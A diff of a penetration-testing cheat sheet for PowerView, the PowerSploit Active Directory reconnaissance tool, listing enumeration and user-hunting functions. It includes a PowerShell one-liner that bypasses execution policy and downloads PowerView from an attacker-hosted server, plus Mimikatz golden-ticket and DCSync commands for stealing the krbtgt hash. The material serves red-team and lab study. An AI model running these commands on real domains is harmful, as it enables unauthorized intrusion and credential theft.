@@ -1,71 +1,106 @@
 PowerView
 
 
-Using a limited shell on a computer that is joined to a domain, enumerate the domain using PowerView.
-
-- Load from Kali
+# Download from Kali
 cd /opt/PowerSploit/Recon/
 python -m SimpleHTTPServer
 
 - Windows
-C:\> mkdir temp
-C:\> cd temp
-C:\temp> powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://10.100.1.2:8000/PowerView.ps1', 'C:\temp\PowerView.ps1')"
-
-C:\temp> powershell.exe -nop -exec bypass                      Start PowerShell and bypass the execution policy
-PS C:\temp> Import-Module .\PowerView.ps1                      Import PowerView
+cd to a discrete, writable directory (C:\Users\<user>\Desktop)
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.0.6:8000/PowerView.ps1', 'PowerView.ps1')"
+powershell.exe -nop -exec bypass
+Import-Module .\PowerView.ps1
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-- Domain Enumeration
-Get-NetDomain                                                  Get the domain name and domain controller (DC)
-Get-DomainSID                                                  Get the domain SID
-(Get-DomainPolicy).”system access”                             Get the domain policy (max password age, min password length)
-Get-NetDomainController                                        Get info about the DC
-Get-NetUser                                                    Show all users and their info
-Get-UserProperty -Properties pwdlastset                        See the last password set of each user
-Find-UserField -SearchField Description -SearchTerm “pass”     Search for the word “pass” in the “description” field for each user in the domain
-Get-NetComputer                                                List all the computers in the current domain
-Get-NetComputer | Out-File -Encoding ascii computers.txt       Output all the computers in the current domain to a file
-Get-NetComputer -OperatingSystem "Windows 7 Ultimate"          List all the operating systems “Windows 7 Ultimate”
-Get-NetComputer -Ping                                          Show pingable computers (live hosts) in the current domain
-Get-NetGroup                                                   Show groups in the current domain
-Get-NetGroup *admin* | Get-NetGroup -Recurse                   Show groups that contain the word “admin” in the group name
-Get-NetGroupMember -GroupName "Domain Admins"                  Show the members of a group
-Get-NetGroup -UserName "leebaird"                              Show the group membership of a user
-Get-NetLocalGroup -ComputerName <target name>                  Show all the local administrators on a machine
-Get-NetLoggedon -ComputerName <target name>                    Show actively logged users on a computer
-Get-LastLoggedOn -ComputerName <target name>                   Show the last logged user on a computer
-Invoke-ShareFinder                                             Find shares on the hosts in the current domain
+- Misc Functions
+Export-PowerViewCSV              Thread-safe CSV append
+Set-MacAttribute                 Sets MAC attributes for a file based on another file or input (from Powersploit)
+Copy-ClonedFile                  Copies a local file to a remote location, matching MAC properties
+Get-IPAddress                    Resolves a hostname to an IP
+Test-Server                      Tests connectivity to a specified server
+Convert-NameToSid                Converts a given user/group name to a security identifier (SID)
+Convert-SidToName                Converts a security identifier (SID) to a group/user name
+Convert-NT4toCanonical           Converts a user/group NT4 name (i.e. dev/john) to canonical format
+Get-Proxy                        Enumerates local proxy settings
+Get-PathAcl                      Get the ACLs for a local/remote file path with optional group recursion
+Get-UserProperty                 Returns all properties specified for users, or a set of user:prop names
+Get-ComputerProperty             Returns all properties specified for computers, or a set of computer:prop names
+Find-InterestingFile             Search a local or remote path for files with specific terms in the name
+Invoke-CheckLocalAdminAccess     Check if the current user context has local administrator access to a specified host
+Get-DomainSearcher               Builds a proper ADSI searcher object for a given domain
+Get-ObjectAcl                    Returns the ACLs associated with a specific active directory object
+Add-ObjectAcl                    Adds an ACL to a specified active directory object
+Get-LastLoggedOn                 Return the last logged on user for a target host
+Get-CachedRDPConnection 		   Queries all saved RDP connection entries on a target host
+Invoke-ACLScanner                Enumerate -1000+ modifable ACLs on a specified domain
+Get-GUIDMap                      Returns a hash table of current GUIDs -> display names
+Get-DomainSID                    Return the SID for the specified domain
+Invoke-ThreadedFunction          Helper that wraps threaded invocation for other functions
 
-- Domain Trust Enumerations
-Get-NetDomainTrust                                             Get a list of all domain trusts for the current domain to map the domain trust
-Get-NetForest                                                  Get details about the current forest
-Get-NetForest -Forest <domain>                                 Get details about another forest
-Get-NetForestDomain                                            Get all the domains in the current forest
-Get-NetForestCatalog                                           Get all global catalogs for the current forest
-Get-NetForestTrust                                             Map the trusts of a forest
+- net * Functions
+Get-NetDomain                    Gets the name of the current user's domain
+Get-NetForest                    Gets the forest associated with the current user's domain
+Get-NetForestDomain              Gets all domains for the current forest
+Get-NetDomainController          Gets the domain controllers for the current computer's domain
+Get-NetUser                      Returns all user objects, or the user specified (wildcard specifiable)
+Add-NetUser                      Adds a local or domain user
+Get-NetComputer                  Gets a list of all current servers in the domain
+Get-NetPrinter                   Gets an array of all current computers objects in a domain
+Get-NetOU                        Gets data for domain organization units
+Get-NetSite                      Gets current sites in a domain
+Get-NetSubnet                    Gets registered subnets for a domain
+Get-NetGroup                     Gets a list of all current groups in a domain
+Get-NetGroupMember               Gets a list of all current users in a specified domain group
+Get-NetLocalGroup                Gets the members of a localgroup on a remote host or hosts
+Add-NetGroupUser                 Adds a local or domain user to a local or domain group
+Get-NetFileServer                Get a list of file servers used by current domain users
+Get-DFSshare                     Gets a list of all distribute file system shares on a domain
+Get-NetShare                     Gets share information for a specified server
+Get-NetLoggedon                  Gets users actively logged onto a specified server
+Get-NetSession                   Gets active sessions on a specified server
+Get-NetRDPSession                Gets active RDP sessions for a specified server (like qwinsta)
+Get-NetProcess                   Gets the remote processes and owners on a remote server
+Get-UserEvent                    Returns logon or TGT events from the event log for a specified host
+Get-ADObject                     Takes a domain SID and returns the user, group, or computer object associated with it
+Set-ADObject                     Takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified
+                                   'PropertyName' to a specified 'PropertyValue'
 
-- Group Policy Enumeration
-Get-NetGPO -ComputerName <target name>                         Get a list of the GPO applied to a specific computer
-Find-GPOComputerAdmin –Computername client-02.fanzy.com        Find users who have local admin rights
-Find-GPOLocation -UserName <user>                              Find all computers that <user> has local administrator rights in the current domain
-Get-NetOU                                                      Get all the Organization Units (OU) in the current domain
+- GPO functions
+Get-GptTmpl                      Parses a GptTmpl.inf to a custom object
+Get-NetGPO                       Gets all current GPOs for a given domain
+Get-NetGPOGroup                  Gets all GPOs in a domain that set "Restricted Groups" on target machines
+Find-GPOLocation                 Takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation
+Find-GPOComputerAdmin            Takes a computer and determines who has admin rights over it through GPO enumeration
+Get-DomainPolicy                 Returns the default domain or DC policy
 
-- User Hunting
-Find-LocalAdminAccess                                          Find all machines where the current user has local admin access
-Invoke-EnumerateLocalAdmin                                     Find local admins on all machines of the domain
-Invoke-UserHunter -ShowAll                                     Find computers where a domain has logged in
-Invoke-UserHunter -UserName “lee"                              Find computers where a specific user has sessions
-Invoke-UserHunter -CheckAccess                                 Find computers where a domain admin is logged in and the current user has access
+- User-Hunting Functions
+Invoke-UserHunter                Finds machines on the local domain where specified users are logged into, and can optionally check if the current
+                                   user has local admin access to found machines
+Invoke-StealthUserHunter         Finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for
+                                   particular users
+Invoke-ProcessHunter             Hunts for processes with a specific name or owned by a specific user on domain machines
+Invoke-UserEventHunter           Hunts for user logon events in domain controller event logs
 
-- ACL Enumeration
-Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs            Enumerate the ACLs for the users group
-Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}      See if there is any user has a modification rights to a GPO
-Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"     Check if a user has the permission (Reset Password)
+- Domain Trust Functions
+Get-NetDomainTrust               Gets all trusts for the current user's domain
+Get-NetForestTrust               Gets all trusts for the forest associated with the current user's domain
+Find-ForeignUser                 Enumerates users who are in groups outside of their principal domain
+Find-ForeignGroup                Enumerates all the members of a domain's groups and finds users that are outside of the queried domain
+Invoke-MapDomainTrust            Try to build a relational mapping of all domain trusts
+
+- MetaFunctions
+Invoke-ShareFinder               Finds (non-standard) shares on hosts in the local domain
+Invoke-FileFinder                Finds potentially sensitive files on hosts in the local domain
+Find-LocalAdminAccess            Finds machines on the domain that the current user has local admin access to
+Find-ManagedSecurityGroups       Searches for active directory security groups which are managed and identify users who have write access to
+                                   those groups (i.e. the ability to add or remove members)
+Find-UserField                   Searches a user field for a particular term
+Find-ComputerField               Searches a computer field for a particular term
+Get-ExploitableSystem            Finds systems likely vulnerable to common exploits
+Invoke-EnumerateLocalAdmin       Enumerates members of the local Administrators groups across all mach
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-PowerView-3.0 tips and tricks
-by HarmJ0y
+# PowerView-3.0 tips and tricks by HarmJ0y
 
 New function naming schema:
    Verbs:
@@ -313,6 +348,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:jwarner.a /domain:testlab.loca
 # dcsync the krbtgt hash from the external.local forest trust
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:external\krbtgt"'
 ------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Presentations
 
 BSides LV 2015             Building an Empire with PowerShell                               www.youtube.com/watch?v=Pq9t59w0mUI
 BSides DC 2015             Bridging the Gap: Lessons in Adversarial Tradecraft              www.youtube.com/watch?v=xHkRhRo3l8o
